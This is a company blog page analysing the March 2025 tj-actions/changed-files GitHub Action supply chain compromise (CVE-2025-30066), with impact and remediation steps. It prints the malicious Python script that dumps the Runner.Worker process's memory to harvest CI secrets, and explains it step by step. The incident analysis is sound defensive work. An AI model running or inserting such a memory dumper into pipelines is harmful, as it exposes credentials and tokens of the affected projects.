<!DOCTYPE html>
<html lang="en">
    <head>
    <title>GitHub Action Vulnerability tj-actions/changed-files  - IT-Premium the premium support for IT services</title><meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Learn about the CVE-2025-30066 vulnerability in tj-actions/changed-files GitHub Action, a supply chain attack exposing secrets in over 23,000 repositories. Discover its impact, mitigation steps, and secure alternatives as of March 17, 2025.">

<meta name="keywords" content="GitHub Actions,tj-actions,changed-files,security vulnerability,supply chain attack,CVE-2025-30066,CI/CD security,secret exposure,base64 encoding,repository compromise,StepSecurity,Harden-Runner,workflow mitigation,malicious code,GitHub repositories">

<link rel="stylesheet" href="https://it-premium.com.ua/style.min.59b47a51e0dbbcf1faabb0ce4c9f05f90e083d7eae92433821ef9e327d9afb0c.css">
<script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
<script defer data-domain="it-premium.com.ua" src="https://analytics.prokopov.me/js/script.js"></script>


<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-WXXRXNBC');</script>


<script id="prop" type="text/html">
    <li>
        <div class="checkbox">
            <input data-bind="checked: checked, attr: {id: label}" type="checkbox">
            <label data-bind="attr: { for: label },text: name">
            </label>
        </div>
        <div class="amount-line" data-bind="visible: has_input">
            <div class="amount">
                <input class="amount-input" data-bind="textInput: value" type="text">
                <div class="amount-change"><a class="up" data-bind="click: incrementCounter" href="#">+</a><a class="down" data-bind="click: decrementCounter" href="#">-</a></div>
            </div>
        </div>
        <span class="text" data-bind="text:input_name"></span>
    </li>
</script>
</head>
    <body><div class="container">
    <nav class="navbar" role="navigation" aria-label="main navigation">
        <div class="navbar-brand">
            <a class="navbar-item" href="https://it-premium.com.ua/en/"> <img src="/images/logo.png " width="240px;" height="34px;" alt="IT-Premium logo"/></a>

            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbarRest" data-bind="click:toggleBurger,class:burgerStatus">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>
        <div id="navbarRest" class="navbar-menu" data-bind="class:burgerStatus">
            <div class="navbar-end">
                <a class="navbar-item telephone" href="tel:380445457732">
                    <span itemprop="telephone">38 (044) 545-77-32</span></a>
                <div class="navbar-item">
                    <a class="button primary-btn" href="https://beta.it-premium.com.ua" rel="nofollow">Customer Zone</a>
                </div>
                <div class="navbar-item">
                    
                    <a class="language__name" href="https://it-premium.com.ua/"><i class="language__flag language__flag--uk"></i>Мова</a>
                    
                    <a class="language__name" href="https://it-premium.com.ua/ru/"><i class="language__flag language__flag--ru"></i>Рус</a>
                    
                    <a class="language__name" href="https://it-premium.com.ua/en/"><i class="language__flag language__flag--en"></i>En</a>
                    
                </div>
            </div>
        </div>
    </nav>
</div>

<section class="section content-page">
    <div class="container">
        <div class="columns">
            <div class="column">
                <h1 class="title hero__title" itemprop="name">
                    GitHub Action Vulnerability tj-actions/changed-files 
                </h1>
        <!-- _default/single.html -->
                <div class="content">
                    <ul>
<li>It seems likely that the tj-actions/changed-files GitHub Action was compromised in a supply chain attack, potentially leaking secrets from CI/CD pipelines.</li>
<li>Research suggests the attack started around March 14, 2025, affecting over 23,000 repositories, with secrets exposed in public build logs.</li>
<li>The evidence leans toward the malicious code dumping CI runner memory, with secrets double-encoded in base64 for public visibility.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_pid</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># https://stackoverflow.com/questions/2703640/process-list-on-linux-via-python</span>
</span></span><span style="display:flex;"><span>    pids <span style="color:#f92672">=</span> [pid <span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#39;/proc&#39;</span>) <span style="color:#66d9ef">if</span> pid<span style="color:#f92672">.</span>isdigit()]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> pids:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/proc&#39;</span>, pid, <span style="color:#e6db74">&#39;cmdline&#39;</span>), <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> cmdline_f:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Runner.Worker&#39;</span> <span style="color:#f92672">in</span> cmdline_f<span style="color:#f92672">.</span>read():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> pid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Can not get pid of Runner.Worker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> get_pid()
</span></span><span style="display:flex;"><span>    print(pid)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    map_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/maps&#34;</span>
</span></span><span style="display:flex;"><span>    mem_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/mem&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(map_path, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> map_f, open(mem_path, <span style="color:#e6db74">&#39;rb&#39;</span>, <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">as</span> mem_f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> map_f<span style="color:#f92672">.</span>readlines():  <span style="color:#75715e"># for each mapped region</span>
</span></span><span style="display:flex;"><span>            m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])&#39;</span>, line)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>:  <span style="color:#75715e"># readable region</span>
</span></span><span style="display:flex;"><span>                start <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                end <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># hotfix: OverflowError: Python int too large to convert to C long</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 18446744073699065856</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> start <span style="color:#f92672">&gt;</span> sys<span style="color:#f92672">.</span>maxsize:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>                mem_f<span style="color:#f92672">.</span>seek(start)  <span style="color:#75715e"># seek to region start</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                    chunk <span style="color:#f92672">=</span> mem_f<span style="color:#f92672">.</span>read(end <span style="color:#f92672">-</span> start)  <span style="color:#75715e"># read region contents</span>
</span></span><span style="display:flex;"><span>                    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(chunk)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><p>This code is designed to extract and dump the memory contents of a specific process running on a Linux system. Let me explain it section by section:</p>
<ol>
<li>
<p>The <code>get_pid()</code> function:</p>
<ul>
<li>It searches through the <code>/proc</code> directory, which contains information about all running processes on a Linux system</li>
<li>It filters for entries that are digits (these are process IDs)</li>
<li>For each process ID, it opens the <code>cmdline</code> file which contains the command that started the process</li>
<li>It looks for a process with &ldquo;Runner.Worker&rdquo; in its command line</li>
<li>When found, it returns that process ID</li>
</ul>
</li>
<li>
<p>The main block:</p>
<ul>
<li>Gets the process ID by calling <code>get_pid()</code></li>
<li>Constructs paths to two special files:
<ul>
<li><code>/proc/{pid}/maps</code>: Contains memory mapping information</li>
<li><code>/proc/{pid}/mem</code>: Provides access to the process&rsquo;s memory</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Memory extraction:</p>
<ul>
<li>Opens both the maps and memory files</li>
<li>Parses each line in the maps file using a regex to extract:
<ul>
<li>Start address of memory region</li>
<li>End address of memory region</li>
<li>Access permissions</li>
</ul>
</li>
<li>For each readable region (&lsquo;r&rsquo; permission):
<ul>
<li>Converts hex addresses to integers</li>
<li>Skips regions with addresses larger than Python&rsquo;s maximum integer size</li>
<li>Seeks to the start position in the memory file</li>
<li>Reads the memory chunk between start and end addresses</li>
<li>Writes the memory contents to standard output</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="background">Background</h3>
<p>The tj-actions/changed-files is a popular GitHub Action used to identify changed files in repositories, aiding in CI/CD processes. Recently, it has been at the center of a security incident that could impact many users relying on automated workflows.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>The vulnerability, tracked as CVE-2025-30066, involved a malicious update to the action, likely through unauthorized access to the repository. This update appears to have injected code that extracts and logs sensitive workflow secrets, such as API keys and tokens, from the CI runner&rsquo;s memory. For public repositories, these logs are accessible, posing a significant risk of secret exposure, though the data is obfuscated via double-encoded base64.</p>
<h3 id="impact-and-response">Impact and Response</h3>
<p>The incident, first reported on March 15, 2025, has led to recommendations for immediate action, including reviewing workflows from March 14 to March 15, 2025, decoding any unexpected output, revoking exposed secrets, and updating to a secure alternative like the one provided by StepSecurity (<a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">Harden-Runner detection</a>). The compromised repository has been taken down, and related malicious scripts have been removed.</p>
<p>An unexpected aspect is that the attack also posed risks to private repositories, where internal viewers with access could potentially see leaked secrets, not just public ones, broadening the scope of impact.</p>
<hr>
<h3 id="survey-note-detailed-analysis-of-the-tj-actionschanged-files-security-vulnerability">Survey Note: Detailed Analysis of the tj-actions/changed-files Security Vulnerability</h3>
<p>This note provides a comprehensive examination of the recent security vulnerability affecting the tj-actions/changed-files GitHub Action, identified as a supply chain attack with significant implications for CI/CD security. The analysis is based on available reports and repository details, aiming to inform users and stakeholders about the nature, impact, and mitigation strategies.</p>
<h4 id="overview-of-tj-actionschanged-files">Overview of tj-actions/changed-files</h4>
<p>The tj-actions/changed-files repository is a GitHub Action designed to retrieve changed files and directories relative to various comparison points, such as target branches or commits. It supports features like fast execution (0-10 seconds), GitHub REST API or Git diff usage, and compatibility across platforms including Linux, MacOS, Windows, and self-hosted runners. Below is a table summarizing its key features:</p>
<table>
  <thead>
      <tr>
          <th><strong>Feature</strong></th>
          <th><strong>Details</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Execution Speed</td>
          <td>Averages 0-10 seconds</td>
      </tr>
      <tr>
          <td>Methods Used</td>
          <td>Leverages GitHub&rsquo;s REST API or Git&rsquo;s native diff command</td>
      </tr>
      <tr>
          <td>Debugging</td>
          <td>Facilitates easy debugging</td>
      </tr>
      <tr>
          <td>Repository Scale</td>
          <td>Scales to handle large/mono repositories</td>
      </tr>
      <tr>
          <td>Submodule Support</td>
          <td>Supports Git submodules</td>
      </tr>
      <tr>
          <td>Merge Queues</td>
          <td>Supports merge queues for pull requests</td>
      </tr>
      <tr>
          <td>JSON Output</td>
          <td>Generates escaped JSON output for matrix jobs, e.g., <a href="https://github.com/tj-actions/changed-files/blob/main/.github/workflows/matrix-example.yml">matrix-example</a></td>
      </tr>
      <tr>
          <td>Directory Listing</td>
          <td>Lists changed directories, with options to limit depth and exclude current directory</td>
      </tr>
      <tr>
          <td>Output Files</td>
          <td>Writes outputs to .txt or .json files for further processing</td>
      </tr>
      <tr>
          <td>File Recovery</td>
          <td>Restores deleted files to previous or new location</td>
      </tr>
      <tr>
          <td>Commit Fetching</td>
          <td>Supports fetching a fixed number of commits for improved performance</td>
      </tr>
      <tr>
          <td>Platform Compatibility</td>
          <td>Compatible with Linux, MacOS, Windows, GitHub-hosted runners, GitHub Enterprise Server, and self-hosted runners</td>
      </tr>
      <tr>
          <td>Change Detection</td>
          <td>Lists changes between pull request branch and target branch, last commit and current change, or last remote branch commit and current HEAD</td>
      </tr>
      <tr>
          <td>Pattern Restriction</td>
          <td>Restricts change detection to a subset of files and directories</td>
      </tr>
  </tbody>
</table>
<p>This action, integrated across over 23,000 repositories, is critical for automation but has now become a vector for a significant security breach.</p>
<h4 id="nature-of-the-vulnerability">Nature of the Vulnerability</h4>
<p>The vulnerability, tracked as CVE-2025-30066, was first reported by StepSecurity on March 15, 2025, with the incident starting around 9:00 AM PT on March 14, 2025 (<a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">Harden-Runner detection</a>). The attack involved a compromise of the repository, likely through unauthorized write access, leading to the injection of malicious code into multiple tagged versions, including v35.9.3, which was updated recently and suspected of exfiltrating credentials (<a href="https://github.com/tj-actions/changed-files/issues/2463">GitHub Issue</a>).</p>
<p>The malicious payload was designed to dump the CI runner&rsquo;s memory, extracting sensitive workflow secrets such as API keys and tokens. These secrets were then logged in the GitHub Actions build logs, with the data double-encoded in base64 to obfuscate it. For public repositories, these logs are accessible, enabling potential exposure to anyone viewing them. However, the risk extends to private repositories, where internal viewers with access could also see leaked secrets, broadening the impact (<a href="https://www.upwind.io/feed/github-actions-supply-chain-compromise-tj-actions-changed-files-action">Upwind</a>).</p>
<p>Wiz Threat Research observed the deployment of scripts designed to dump secrets, confirming the exfiltration mechanism (<a href="https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066">Wiz Blog</a>). The compromised commit, identified as 0e58ed8671d6b60d0890c21b07f8835ace038e67, was removed from all tags and branches, with measures implemented to prevent future issues. Users were advised to review workflows between March 14 and March 15, 2025, decode unexpected output with <code>echo 'xxx' | base64 -d | base64 -d</code>, revoke exposed secrets, and update workflows referencing the compromised commit SHA.</p>
<h4 id="impact-assessment">Impact Assessment</h4>
<p>The scale of the impact is significant, with the action used in over 23,000 repositories, posing a high risk of credential theft and CI pipeline compromise. For public repositories, the exposure of secrets in build logs could lead to unauthorized access to systems, while private repositories face internal leakage risks. The attack highlights the growing threat of supply chain attacks in CI/CD environments, as noted by Sysdig, which recommends runtime security controls and cloud detection tools like Falco and Sysdig Secure for mitigation (<a href="https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066">Sysdig</a>).</p>
<p>Semgrep and other security firms have emphasized the need for immediate action, with Semgrep providing a rule to find usages of the compromised action in codebases (<a href="https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/">Semgrep</a>). The repository has been taken down, and related GitHub gists containing malicious scripts have been removed, as reported in Japanese security news (<a href="https://rocket-boys.co.jp/security-measures-lab/github-actions-tj-actions-changed-files-vulnerability-cve-2025-30066/">Rocket Boys</a>).</p>
<h4 id="mitigation-and-response">Mitigation and Response</h4>
<p>Immediate remediation steps include:</p>
<ul>
<li>Reviewing all workflows executed between March 14 and March 15, 2025, for suspicious activity.</li>
<li>Decoding any unexpected output in logs using <code>echo 'xxx' | base64 -d | base64 -d</code> to check for exposed secrets.</li>
<li>Revoking all potentially exposed secrets, such as API keys and tokens, to prevent unauthorized access.</li>
<li>Updating workflows to use a secure alternative, such as the drop-in replacement provided by StepSecurity (<a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">Harden-Runner detection</a>).</li>
</ul>
<p>StepSecurity and other firms have released free secure replacements, strongly recommending users to replace all instances of tj-actions/changed-files with these alternatives. The community has also discussed the need for better security practices, such as pinning actions by commit hash and minimizing reliance on third-party actions, as highlighted in discussions on Hacker News and Lobsters (<a href="https://news.ycombinator.com/item?id=43367987">Hacker News</a>, <a href="https://lobste.rs/s/4ko499/popular_github_action_tj_actions_changed">Lobsters</a>).</p>
<p>The tj-actions/changed-files security vulnerability represents a critical supply chain attack, compromising CI/CD pipelines and exposing sensitive secrets. With the incident starting on March 14, 2025, and affecting a wide user base, immediate action is essential to mitigate risks. Users are encouraged to follow the recommended remediation steps and adopt secure alternatives to safeguard their repositories.</p>

                </div>
            </div>
        </div><div class="hero__cta">
  <a class="button is-primary button__cta" href="tel:+380445457732">Call Now</a>
</div>

    </div>
</section>
<script src="/js/main.js"></script>


<script src="https://it-premium.com.ua/js/initmap.min.e9f249fc9fb27f7e07e200a8cca34dc88c68e4bc34722ae7b1de841a7a752cf4.js"> </script>
<script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCL9pCpumG1Z-Fi2Jy8R8mQv1e328dXNHU&callback=initMap&loading=async"> </script>



<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXXRXNBC" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>


<script>
 if (window.netlifyIdentity) {
     window.netlifyIdentity.on("init", (user) => {
         if (!user) {
             window.netlifyIdentity.on("login", () => {
                 document.location.href = "/admin/";
             });
         }
     });
 }
</script>
</body>
</html>
